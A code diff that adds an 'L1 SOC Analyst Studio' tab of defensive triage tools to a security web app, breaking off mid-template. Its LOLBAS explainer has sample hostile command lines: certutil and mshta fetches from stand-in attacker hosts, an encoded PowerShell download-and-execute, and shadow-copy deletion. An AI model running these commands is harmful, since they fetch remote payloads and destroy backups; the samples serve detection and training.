@@ -192,7 +192,12 @@
           <i data-lucide="book-open-check" class="w-4 h-4 text-amber-400 flex-shrink-0"></i>
           <span>SOC Playbooks</span>
         </button>
+        <button onclick="switchTab('soctoolkit')" id="tab-btn-soctoolkit" class="tab-btn w-full px-3 py-2 rounded-xl text-xs font-mono font-bold flex items-center gap-2.5 transition-all text-slate-400 hover:text-white hover:bg-white/5 text-left" title="L1 SOC Analyst Studio">
+          <i data-lucide="cpu" class="w-4 h-4 flex-shrink-0 text-cyber-cyan"></i>
+          <span>L1 SOC Studio</span>
+        </button>
       </div>
+
 
       <!-- GROUP 2: DEEP ANALYSIS & FORENSICS -->
       <div class="space-y-1">
@@ -1525,6 +1530,319 @@
       </div>
     </section>
 
+    <!-- ============================================================
+         TAB 10: L1 SOC ANALYST TOOLKIT STUDIO
+         ============================================================ -->
+    <section id="view-soctoolkit" class="hidden space-y-6">
+      
+      <!-- Studio Header & Sub-Navigation Bar -->
+      <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+          <div>
+            <h3 class="text-sm font-bold text-white flex items-center gap-2">
+              <i data-lucide="cpu" class="w-4 h-4 text-cyber-cyan"></i>
+              L1 SOC Analyst Studio & Investigation Accelerators
+            </h3>
+            <p class="text-xs text-slate-400 font-mono mt-0.5">Rapid triage tools for Event IDs, LOLBAS abuse, impossible travel speed, false-positive validation, and bot dissection</p>
+          </div>
+        </div>
+
+        <!-- Sub-Tool Switcher Pills -->
+        <div class="flex flex-wrap gap-2 pt-1 border-t border-cyber-border/60">
+          <button onclick="switchSocSubTool('events')" id="soc-sub-btn-events" class="soc-sub-btn px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition flex items-center gap-1.5 bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30">
+            <i data-lucide="file-question" class="w-3.5 h-3.5"></i>
+            <span>Event & Error Codes</span>
+          </button>
+          <button onclick="switchSocSubTool('lolbas')" id="soc-sub-btn-lolbas" class="soc-sub-btn px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition flex items-center gap-1.5 text-slate-400 hover:text-white hover:bg-white/5 border border-transparent">
+            <i data-lucide="terminal" class="w-3.5 h-3.5"></i>
+            <span>LOLBAS Explainer</span>
+          </button>
+          <button onclick="switchSocSubTool('travel')" id="soc-sub-btn-travel" class="soc-sub-btn px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition flex items-center gap-1.5 text-slate-400 hover:text-white hover:bg-white/5 border border-transparent">
+            <i data-lucide="plane" class="w-3.5 h-3.5"></i>
+            <span>Impossible Travel</span>
+          </button>
+          <button onclick="switchSocSubTool('fp')" id="soc-sub-btn-fp" class="soc-sub-btn px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition flex items-center gap-1.5 text-slate-400 hover:text-white hover:bg-white/5 border border-transparent">
+            <i data-lucide="shield-check" class="w-3.5 h-3.5"></i>
+            <span>FP & Whitelist Helper</span>
+          </button>
+          <button onclick="switchSocSubTool('ipclass')" id="soc-sub-btn-ipclass" class="soc-sub-btn px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition flex items-center gap-1.5 text-slate-400 hover:text-white hover:bg-white/5 border border-transparent">
+            <i data-lucide="network" class="w-3.5 h-3.5"></i>
+            <span>IP Classifier</span>
+          </button>
+          <button onclick="switchSocSubTool('ua')" id="soc-sub-btn-ua" class="soc-sub-btn px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition flex items-center gap-1.5 text-slate-400 hover:text-white hover:bg-white/5 border border-transparent">
+            <i data-lucide="bot" class="w-3.5 h-3.5"></i>
+            <span>User-Agent Dissector</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- ==========================================
+           SUB-TOOL 1: WINDOWS EVENT & ERROR DECODER
+           ========================================== -->
+      <div id="soc-panel-events" class="soc-panel space-y-4">
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+          <div class="flex items-center justify-between">
+            <h4 class="text-xs font-bold text-white uppercase font-mono flex items-center gap-2">
+              <i data-lucide="binary" class="w-4 h-4 text-cyber-cyan"></i>
+              Windows Security Event ID & NTSTATUS Error Code Decoder
+            </h4>
+            <span class="text-[10px] font-mono text-slate-500">Instant offline reference</span>
+          </div>
+          <div class="flex gap-2">
+            <input 
+              id="soc-event-query" 
+              type="text" 
+              placeholder="Enter Event ID (e.g. 4625, 4688, 7045), NTSTATUS code (e.g. 0xC000006A, 0xC0000064), or Logon Type (e.g. 10)..."
+              class="flex-1 bg-[#090d16] border border-cyber-border rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-cyber-cyan"
+              onkeydown="if(event.key==='Enter') runSocEventLookup()"
+            />
+            <button onclick="runSocEventLookup()" class="px-4 py-2 bg-cyber-cyan hover:bg-cyber-cyan/90 text-slate-950 font-bold font-mono text-xs rounded-lg transition flex items-center gap-1.5">
+              <i data-lucide="search" class="w-3.5 h-3.5"></i> Decode
+            </button>
+          </div>
+          <!-- Sample Pills -->
+          <div class="flex flex-wrap gap-1.5 items-center text-[11px] font-mono text-slate-400">
+            <span class="text-slate-500 text-[10px]">Quick Samples:</span>
+            <button onclick="quickFillEvent('0xC000006A')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-amber-400 border border-amber-500/30">0xC000006A (Password Spray)</button>
+            <button onclick="quickFillEvent('0xC0000064')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-red-400 border border-red-500/30">0xC0000064 (User Enum)</button>
+            <button onclick="quickFillEvent('0xC0000234')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-slate-300 border border-cyber-border">0xC0000234 (Lockout)</button>
+            <button onclick="quickFillEvent('4688')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-blue-400 border border-blue-500/30">Event 4688 (Process Created)</button>
+            <button onclick="quickFillEvent('1102')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-red-400 border border-red-500/30">Event 1102 (Log Cleared)</button>
+            <button onclick="quickFillEvent('Type 10')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-purple-400 border border-purple-500/30">Logon Type 10 (RDP)</button>
+          </div>
+        </div>
+        <!-- Result Container -->
+        <div id="soc-event-results" class="hidden space-y-3"></div>
+      </div>
+
+      <!-- ==========================================
+           SUB-TOOL 2: LOLBAS COMMAND LINE EXPLAINER
+           ========================================== -->
+      <div id="soc-panel-lolbas" class="soc-panel hidden space-y-4">
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+          <div class="flex items-center justify-between">
+            <h4 class="text-xs font-bold text-white uppercase font-mono flex items-center gap-2">
+              <i data-lucide="terminal" class="w-4 h-4 text-cyber-cyan"></i>
+              LOLBAS & Living-Off-The-Land Command Line Dissector
+            </h4>
+            <span class="text-[10px] font-mono text-slate-500">MITRE ATT&CK Correlated</span>
+          </div>
+          <textarea 
+            id="soc-lolbas-input" 
+            rows="3" 
+            placeholder="Paste suspicious command line (e.g. certutil.exe -urlcache -split -f http://evil.com/drop.exe payload.exe)..."
+            class="w-full bg-[#090d16] border border-cyber-border rounded-lg p-3 text-xs font-mono text-white focus:outline-none focus:border-cyber-cyan custom-scrollbar"
+          ></textarea>
+          <div class="flex flex-wrap items-center justify-between gap-2">
+            <div class="flex flex-wrap gap-1.5 items-center text-[11px] font-mono text-slate-400">
+              <span class="text-slate-500 text-[10px]">Test Samples:</span>
+              <button onclick="quickFillLolbas('certutil.exe -urlcache -split -f https://malware-drop.xyz/loader.exe update.exe')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-amber-400 border border-amber-500/30">certutil download</button>
+              <button onclick="quickFillLolbas('vssadmin.exe delete shadows /all /quiet')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-red-400 border border-red-500/30">vssadmin ransomware</button>
+              <button onclick="quickFillLolbas('powershell.exe -w hidden -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBzAC4AcABzADEAIgApAA==')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-purple-400 border border-purple-500/30">powershell -enc</button>
+              <button onclick="quickFillLolbas('mshta.exe javascript:a=GetObject(\'script:https://evil.com/test.sct\').Exec();close();')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-blue-400 border border-blue-500/30">mshta inline</button>
+            </div>
+            <button onclick="runSocLolbasAnalysis()" class="px-4 py-2 bg-cyber-cyan hover:bg-cyber-cyan/90 text-slate-950 font-bold font-mono text-xs rounded-lg transition flex items-center gap-1.5">
+              <i data-lucide="play" class="w-3.5 h-3.5"></i> Analyze Command
+            </button>
+          </div>
+        </div>
+        <div id="soc-lolbas-results" class="hidden space-y-3"></div>
+      </div>
+
+      <!-- ==========================================
+           SUB-TOOL 3: IMPOSSIBLE TRAVEL CALCULATOR
+           ========================================== -->
+      <div id="soc-panel-travel" class="soc-panel hidden space-y-4">
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
+          <div class="flex items-center justify-between">
+            <h4 class="text-xs font-bold text-white uppercase font-mono flex items-center gap-2">
+              <i data-lucide="plane" class="w-4 h-4 text-cyber-cyan"></i>
+              Impossible Travel & Risky Sign-in Speed Calculator
+            </h4>
+            <span class="text-[10px] font-mono text-slate-500">Haversine Great-Circle Geodesics</span>
+          </div>
+          
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <!-- Event 1 -->
+            <div class="bg-[#090d16] border border-cyber-border/70 rounded-lg p-3 space-y-2 text-xs font-mono">
+              <div class="font-bold text-cyber-cyan flex items-center gap-1">
+                <span>Event A (First Sign-in)</span>
+              </div>
+              <div>
+                <label class="text-[10px] text-slate-500">Location Name:</label>
+                <input id="soc-tr-loc1" type="text" value="Jakarta, Indonesia" class="w-full bg-[#050811] border border-cyber-border rounded px-2.5 py-1 text-white text-xs mt-0.5 focus:outline-none focus:border-cyber-cyan" />
+              </div>
+              <div class="grid grid-cols-2 gap-2">
+                <div>
+                  <label class="text-[10px] text-slate-500">Latitude:</label>
+                  <input id="soc-tr-lat1" type="number" step="any" value="-6.2088" class="w-full bg-[#050811] border border-cyber-border rounded px-2.5 py-1 text-white text-xs mt-0.5 focus:outline-none focus:border-cyber-cyan" />
+                </div>
+                <div>
+                  <label class="text-[10px] text-slate-500">Longitude:</label>
+                  <input id="soc-tr-lon1" type="number" step="any" value="106.8456" class="w-full bg-[#050811] border border-cyber-border rounded px-2.5 py-1 text-white text-xs mt-0.5 focus:outline-none focus:border-cyber-cyan" />
+                </div>
+              </div>
+              <div>
+                <label class="text-[10px] text-slate-500">Timestamp (UTC / Local):</label>
+                <input id="soc-tr-time1" type="text" value="2026-10-13 08:00:00" class="w-full bg-[#050811] border border-cyber-border rounded px-2.5 py-1 text-white text-xs mt-0.5 focus:outline-none focus:border-cyber-cyan" />
+              </div>
+            </div>
+
+            <!-- Event 2 -->
+            <div class="bg-[#090d16] border border-cyber-border/70 rounded-lg p-3 space-y-2 text-xs font-mono">
+              <div class="font-bold text-amber-400 flex items-center gap-1">
+                <span>Event B (Second Sign-in)</span>
+              </div>
+              <div>
+                <label class="text-[10px] text-slate-500">Location Name:</label>
+                <input id="soc-tr-loc2" type="text" value="Frankfurt, Germany" class="w-full bg-[#050811] border border-cyber-border rounded px-2.5 py-1 text-white text-xs mt-0.5 focus:outline-none focus:border-cyber-cyan" />
+              </div>
+              <div class="grid grid-cols-2 gap-2">
+                <div>
+                  <label class="text-[10px] text-slate-500">Latitude:</label>
+                  <input id="soc-tr-lat2" type="number" step="any" value="50.1109" class="w-full bg-[#050811] border border-cyber-border rounded px-2.5 py-1 text-white text-xs mt-0.5 focus:outline-none focus:border-cyber-cyan" />
+                </div>
+                <div>
+                  <label class="text-[10px] text-slate-500">Longitude:</label>
+                  <input id="soc-tr-lon2" type="number" step="any" value="8.6821" class="w-full bg-[#050811] border border-cyber-border rounded px-2.5 py-1 text-white text-xs mt-0.5 focus:outline-none focus:border-cyber-cyan" />
+                </div>
+              </div>
+              <div>
+                <label class="text-[10px] text-slate-500">Timestamp (UTC / Local):</label>
+                <input id="soc-tr-time2" type="text" value="2026-10-13 08:35:00" class="w-full bg-[#050811] border border-cyber-border rounded px-2.5 py-1 text-white text-xs mt-0.5 focus:outline-none focus:border-cyber-cyan" />
+              </div>
+            </div>
+          </div>
+
+          <div class="flex flex-wrap items-center justify-between gap-2 pt-1">
+            <div class="flex flex-wrap gap-1.5 items-center text-[11px] font-mono text-slate-400">
+              <span class="text-slate-500 text-[10px]">Presets:</span>
+              <button onclick="setTravelPreset('jkt_fra')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-red-400 border border-red-500/30">Jakarta -> Frankfurt (35m)</button>
+              <button onclick="setTravelPreset('nyc_lon')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-amber-400 border border-amber-500/30">NYC -> London (10m)</button>
+              <button onclick="setTravelPreset('normal')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-emerald-400 border border-emerald-500/30">Jakarta -> Bandung (3h)</button>
+            </div>
+            <button onclick="runSocTravelCalculation()" class="px-4 py-2 bg-cyber-cyan hover:bg-cyber-cyan/90 text-slate-950 font-bold font-mono text-xs rounded-lg transition flex items-center gap-1.5">
+              <i data-lucide="calculator" class="w-3.5 h-3.5"></i> Calculate Velocity
+            </button>
+          </div>
+        </div>
+        <div id="soc-travel-results" class="hidden space-y-3"></div>
+      </div>
+
+      <!-- ==========================================
+           SUB-TOOL 4: FALSE POSITIVE & WHITELIST HELPER
+           ========================================== -->
+      <div id="soc-panel-fp" class="soc-panel hidden space-y-4">
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+          <div class="flex items-center justify-between">
+            <h4 class="text-xs font-bold text-white uppercase font-mono flex items-center gap-2">
+              <i data-lucide="shield-check" class="w-4 h-4 text-cyber-cyan"></i>
+              False Positive & Known-Good Whitelist Checker
+            </h4>
+            <span class="text-[10px] font-mono text-slate-500">Includes CIRCL NSRL Hash Database</span>
+          </div>
+          <div class="flex gap-2">
+            <input 
+              id="soc-fp-input" 
+              type="text" 
+              placeholder="Enter Domain, Tool, or SHA256/MD5 hash (e.g. events.data.microsoft.com, anydesk.exe)..."
+              class="flex-1 bg-[#090d16] border border-cyber-border rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-cyber-cyan"
+              onkeydown="if(event.key==='Enter') runSocFpCheck()"
+            />
+            <button onclick="runSocFpCheck()" class="px-4 py-2 bg-cyber-cyan hover:bg-cyber-cyan/90 text-slate-950 font-bold font-mono text-xs rounded-lg transition flex items-center gap-1.5">
+              <i data-lucide="search" class="w-3.5 h-3.5"></i> Check Whitelist
+            </button>
+          </div>
+          <div class="flex flex-wrap gap-1.5 items-center text-[11px] font-mono text-slate-400">
+            <span class="text-slate-500 text-[10px]">Test Samples:</span>
+            <button onclick="quickFillFp('events.data.microsoft.com')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-emerald-400 border border-emerald-500/30">events.data.microsoft.com</button>
+            <button onclick="quickFillFp('anydesk.exe')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-amber-400 border border-amber-500/30">anydesk.exe</button>
+            <button onclick="quickFillFp('cloudflare-dns.com')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-blue-400 border border-blue-500/30">cloudflare-dns.com</button>
+            <button onclick="quickFillFp('cbf8297a7a14e1388044cc18471b05dd81c5d985a9bc69a19c636f32230673ac')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-slate-300 border border-cyber-border">NSRL hash (explorer.exe)</button>
+          </div>
+        </div>
+        <div id="soc-fp-results" class="hidden space-y-3"></div>
+      </div>
+
+      <!-- ==========================================
+           SUB-TOOL 5: IP CLASSIFIER
+           ========================================== -->
+      <div id="soc-panel-ipclass" class="soc-panel hidden space-y-4">
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+          <div class="flex items-center justify-between">
+            <h4 class="text-xs font-bold text-white uppercase font-mono flex items-center gap-2">
+              <i data-lucide="network" class="w-4 h-4 text-cyber-cyan"></i>
+              IP Infrastructure & Anonymizer Classifier
+            </h4>
+            <span class="text-[10px] font-mono text-slate-500">Tor Exit, Datacenter Cloud, VPN Detection</span>
+          </div>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-2">
+            <div>
+              <label class="text-[10px] font-mono text-slate-500">Target IP:</label>
+              <input id="soc-ip-input" type="text" placeholder="185.220.101.5" class="w-full bg-[#090d16] border border-cyber-border rounded-lg px-3 py-1.5 text-xs font-mono text-white mt-1 focus:outline-none focus:border-cyber-cyan" />
+            </div>
+            <div>
+              <label class="text-[10px] font-mono text-slate-500">ASN (Optional):</label>
+              <input id="soc-ip-asn" type="text" placeholder="AS16509 Amazon" class="w-full bg-[#090d16] border border-cyber-border rounded-lg px-3 py-1.5 text-xs font-mono text-white mt-1 focus:outline-none focus:border-cyber-cyan" />
+            </div>
+            <div>
+              <label class="text-[10px] font-mono text-slate-500">Org / ISP (Optional):</label>
+              <input id="soc-ip-org" type="text" placeholder="Mullvad VPN / AWS" class="w-full bg-[#090d16] border border-cyber-border rounded-lg px-3 py-1.5 text-xs font-mono text-white mt-1 focus:outline-none focus:border-cyber-cyan" />
+            </div>
+          </div>
+          <div class="flex flex-wrap items-center justify-between gap-2 pt-1">
+            <div class="flex flex-wrap gap-1.5 items-center text-[11px] font-mono text-slate-400">
+              <span class="text-slate-500 text-[10px]">Presets:</span>
+              <button onclick="setIpPreset('185.220.101.5', 'AS9009', 'Tor exit node')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-red-400 border border-red-500/30">Tor Node</button>
+              <button onclick="setIpPreset('54.239.28.85', 'AS16509', 'Amazon.com')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-blue-400 border border-blue-500/30">AWS Cloud</button>
+              <button onclick="setIpPreset('198.54.135.1', 'AS39351', 'Mullvad VPN')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-amber-400 border border-amber-500/30">Mullvad VPN</button>
+            </div>
+            <button onclick="runSocIpClassify()" class="px-4 py-2 bg-cyber-cyan hover:bg-cyber-cyan/90 text-slate-950 font-bold font-mono text-xs rounded-lg transition flex items-center gap-1.5">
+              <i data-lucide="shield" class="w-3.5 h-3.5"></i> Classify IP
+            </button>
+          </div>
+        </div>
+        <div id="soc-ipclass-results" class="hidden space-y-3"></div>
+      </div>
+
+      <!-- ==========================================
+           SUB-TOOL 6: USER-AGENT DISSECTOR
+           ========================================== -->
+      <div id="soc-panel-ua" class="soc-panel hidden space-y-4">
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+          <div class="flex items-center justify-between">
+            <h4 class="text-xs font-bold text-white uppercase font-mono flex items-center gap-2">
+              <i data-lucide="bot" class="w-4 h-4 text-cyber-cyan"></i>
+              HTTP User-Agent & Scanner Tool Dissector
+            </h4>
+            <span class="text-[10px] font-mono text-slate-500">Detects offensive scanners, headless bots, and script libraries</span>
+          </div>
+          <textarea 
+            id="soc-ua-input" 
+            rows="2" 
+            placeholder="Paste User-Agent string (e.g. sqlmap/1.6#stable, python-requests/2.31.0, HeadlessChrome)..."
+            class="w-full bg-[#090d16] border border-cyber-border rounded-lg p-3 text-xs font-mono text-white focus:outline-none focus:border-cyber-cyan custom-scrollbar"
+          ></textarea>
+          <div class="flex flex-wrap items-center justify-between gap-2">
+            <div class="flex flex-wrap gap-1.5 items-center text-[11px] font-mono text-slate-400">
+              <span class="text-slate-500 text-[10px]">Test Signatures:</span>
+              <button onclick="quickFillUa('sqlmap/1.6#stable (https://sqlmap.org)')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-red-400 border border-red-500/30">sqlmap scanner</button>
+              <button onclick="quickFillUa('Mozilla/5.0 (compatible; ProjectDiscovery Nuclei v3.1)')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-red-400 border border-red-500/30">nuclei scanner</button>
+              <button onclick="quickFillUa('python-requests/2.31.0')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-amber-400 border border-amber-500/30">python-requests</button>
+              <button onclick="quickFillUa('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 HeadlessChrome/114.0 Safari/537.36')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-purple-400 border border-purple-500/30">HeadlessChrome</button>
+              <button onclick="quickFillUa('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')" class="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-slate-300 border border-cyber-border">IE 6 (Ancient C2)</button>
+            </div>
+            <button onclick="runSocUaDissect()" class="px-4 py-2 bg-cyber-cyan hover:bg-cyber-cyan/90 text-slate-950 font-bold font-mono text-xs rounded-lg transition flex items-center gap-1.5">
+              <i data-lucide="scan" class="w-3.5 h-3.5"></i> Dissect User-Agent
+            </button>
+          </div>
+        </div>
+        <div id="soc-ua-results" class="hidden space-y-3"></div>
+      </div>
+
+    </section>
+
+
   </main>
 
   <!-- CYBERPUNK HUD FOOTER & CREATOR WATERMARK -->
@@ -1946,7 +2264,8 @@ Content-Type: text/html; charset=UTF-8
       cve: "Online CVE & NIST NVD Intel",
       mitre: "MITRE ATT&CK® Matrix & TTP Heatmap",
       sanitize: "IoC Defanger & Text Normalizer",
-      cache: "Cache & Investigation Logs"
+      cache: "Cache & Investigation Logs",
+      soctoolkit: "L1 SOC Analyst Studio"
     };
 
     function toggleSidebar(forceState) {
@@ -1966,7 +2285,7 @@ Content-Type: text/html; charset=UTF-8
     }
 
     function switchTab(tabId) {
-      ['triage', 'recon', 'eml', 'urltrace', 'deobf', 'mail', 'feed', 'cve', 'mitre', 'sanitize', 'cache'].forEach(t => {
+      ['triage', 'recon', 'eml', 'urltrace', 'deobf', 'mail', 'feed', 'cve', 'mitre', 'sanitize', 'cache', 'soctoolkit'].forEach(t => {
         const view = document.getElementById(`view-${t}`);
         const btn = document.getElementById(`tab-btn-${t}`);
         if (view) view.classList.add('hidden');
@@ -1975,6 +2294,7 @@ Content-Type: text/html; charset=UTF-8
           btn.classList.add('text-slate-400');
         }
       });
+
 
       const activeView = document.getElementById(`view-${tabId}`);
       const activeBtn = document.getElementById(`tab-btn-${tabId}`);
@@ -4744,6 +5064,424 @@ https://storage.malicious-cloud.com/dropper.exe (SHA256: e3b0c44298fc1c149afbf4c
         setTimeout(() => { st.innerText = ""; }, 2500);
       }
     }
+
+    // ==========================================
+    // TAB 10: L1 SOC ANALYST STUDIO LOGIC
+    // ==========================================
+    function switchSocSubTool(toolId) {
+      ['events', 'lolbas', 'travel', 'fp', 'ipclass', 'ua'].forEach(t => {
+        const panel = document.getElementById(`soc-panel-${t}`);
+        const btn = document.getElementById(`soc-sub-btn-${t}`);
+        if (panel) panel.classList.add('hidden');
+        if (btn) {
+          btn.classList.remove('bg-cyber-cyan/15', 'text-cyber-cyan', 'border-cyber-cyan/30');
+          btn.classList.add('text-slate-400', 'border-transparent');
+        }
+      });
+
+      const activePanel = document.getElementById(`soc-panel-${toolId}`);
+      const activeBtn = document.getElementById(`soc-sub-btn-${toolId}`);
+      if (activePanel) activePanel.classList.remove('hidden');
+      if (activeBtn) {
+        activeBtn.classList.add('bg-cyber-cyan/15', 'text-cyber-cyan', 'border-cyber-cyan/30');
+        activeBtn.classList.remove('text-slate-400', 'border-transparent');
+      }
+      lucide.createIcons();
+    }
+
+    // Tool 1: Event & Error Decoder
+    function quickFillEvent(val) {
+      document.getElementById('soc-event-query').value = val;
+      runSocEventLookup();
+    }
+
+    async function runSocEventLookup() {
+      const query = document.getElementById('soc-event-query').value.trim();
+      if (!query) return;
+      const resEl = document.getElementById('soc-event-results');
+      resEl.classList.remove('hidden');
+      resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-cyber-border rounded-xl text-xs font-mono text-slate-400">Decoding ${escapeHtml(query)}...</div>`;
+
+      try {
+        const resp = await fetch('/api/soc/event-lookup', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ query })
+        });
+        const data = await resp.json();
+
+        let html = '';
+        if (data.matched_ntstatus && data.matched_ntstatus.length > 0) {
+          data.matched_ntstatus.forEach(item => {
+            const riskColor = item.risk === 'HIGH' ? 'text-red-400 bg-red-500/15 border-red-500/30' : (item.risk === 'MEDIUM' ? 'text-amber-400 bg-amber-500/15 border-amber-500/30' : 'text-slate-300 bg-white/5 border-cyber-border');
+            html += `
+              <div class="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
+                <div class="flex items-center justify-between">
+                  <span class="font-bold text-white font-mono text-sm">${escapeHtml(item.code)} : ${escapeHtml(item.name)}</span>
+                  <span class="text-[10px] font-mono px-2 py-0.5 rounded border font-bold ${riskColor}">${item.risk} RISK</span>
+                </div>
+                <p class="text-xs text-slate-300 font-sans">${escapeHtml(item.description)}</p>
+                <div class="p-2.5 rounded bg-[#090d16] border border-cyber-border/70 text-xs font-mono text-cyber-cyan">
+                  <span class="text-slate-500 font-bold">SOC Context:</span> ${escapeHtml(item.soc_context)}
+                </div>
+                <div class="text-[11px] font-mono text-amber-300/90">
+                  <span class="text-slate-500 font-bold">Triage Hint:</span> ${escapeHtml(item.triage_hint)}
+                </div>
+              </div>
+            `;
+          });
+        }
+
+        if (data.matched_events && data.matched_events.length > 0) {
+          data.matched_events.forEach(item => {
+            html += `
+              <div class="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
+                <div class="flex items-center justify-between">
+                  <span class="font-bold text-white font-mono text-sm">${escapeHtml(item.source)} Event ID ${escapeHtml(item.event_id)} : ${escapeHtml(item.name)}</span>
+                  <span class="text-[10px] font-mono px-2 py-0.5 rounded border font-bold text-cyber-cyan bg-cyber-cyan/15 border-cyber-cyan/30">MONITORED</span>
+                </div>
+                <p class="text-xs text-slate-300 font-sans">${escapeHtml(item.description)}</p>
+                <div class="p-2.5 rounded bg-[#090d16] border border-cyber-border/70 text-xs font-mono text-amber-300">
+                  <span class="text-slate-500 font-bold">Analyst Guidance:</span> ${escapeHtml(item.soc_guidance)}
+                </div>
+              </div>
+            `;
+          });
+        }
+
+        if (data.matched_logon_types && data.matched_logon_types.length > 0) {
+          data.matched_logon_types.forEach(item => {
+            html += `
+              <div class="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
+                <div class="flex items-center justify-between">
+                  <span class="font-bold text-purple-400 font-mono text-sm">Windows Logon Type ${escapeHtml(item.logon_type)} : ${escapeHtml(item.name)}</span>
+                  <span class="text-[10px] font-mono px-2 py-0.5 rounded border font-bold text-purple-300 bg-purple-500/15 border-purple-500/30">LOGON TYPE</span>
+                </div>
+                <p class="text-xs text-slate-300 font-sans">${escapeHtml(item.description)}</p>
+                <div class="grid grid-cols-2 gap-2 text-xs font-mono text-slate-400 pt-1">
+                  <div><span class="text-slate-500">Typical Source:</span> <span class="text-white">${escapeHtml(item.typical_source)}</span></div>
+                  <div><span class="text-slate-500">Risk Assessment:</span> <span class="text-amber-300">${escapeHtml(item.risk)}</span></div>
+                </div>
+              </div>
+            `;
+          });
+        }
+
+        if (!html) {
+          html = `<div class="p-4 bg-cyber-card border border-cyber-border rounded-xl text-xs font-mono text-slate-400">No exact matches found for "${escapeHtml(query)}". Try an Event ID (e.g. 4625, 4688), NTSTATUS code (e.g. 0xC000006A), or Logon Type (e.g. 10).</div>`;
+        }
+
+        resEl.innerHTML = html;
+        lucide.createIcons();
+      } catch (e) {
+        resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-red-500/40 rounded-xl text-xs font-mono text-red-400">Error: ${e.message}</div>`;
+      }
+    }
+
+    // Tool 2: LOLBAS Command Explainer
+    function quickFillLolbas(cmd) {
+      document.getElementById('soc-lolbas-input').value = cmd;
+      runSocLolbasAnalysis();
+    }
+
+    async function runSocLolbasAnalysis() {
+      const command = document.getElementById('soc-lolbas-input').value.trim();
+      if (!command) return;
+      const resEl = document.getElementById('soc-lolbas-results');
+      resEl.classList.remove('hidden');
+      resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-cyber-border rounded-xl text-xs font-mono text-slate-400">Analyzing command line for Living-Off-The-Land abuse...</div>`;
+
+      try {
+        const resp = await fetch('/api/soc/lolbas', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ command })
+        });
+        const data = await resp.json();
+
+        let html = '';
+        if (data.is_lolbas && data.matched_tools.length > 0) {
+          data.matched_tools.forEach(tool => {
+            const riskColor = tool.risk === 'CRITICAL' ? 'text-red-400 bg-red-500/15 border-red-500/30' : (tool.risk === 'HIGH' ? 'text-amber-400 bg-amber-500/15 border-amber-500/30' : 'text-blue-400 bg-blue-500/15 border-blue-500/30');
+            const flagsHtml = (tool.flagged_args || []).map(f => `
+              <div class="p-2 rounded bg-[#090d16] border border-cyber-border text-xs font-mono">
+                <span class="text-amber-400 font-bold">${escapeHtml(f.flag)}</span> : <span class="text-slate-300">${escapeHtml(f.explanation)}</span>
+              </div>
+            `).join('');
+
+            html += `
+              <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+                <div class="flex items-center justify-between">
+                  <div class="flex items-center gap-2">
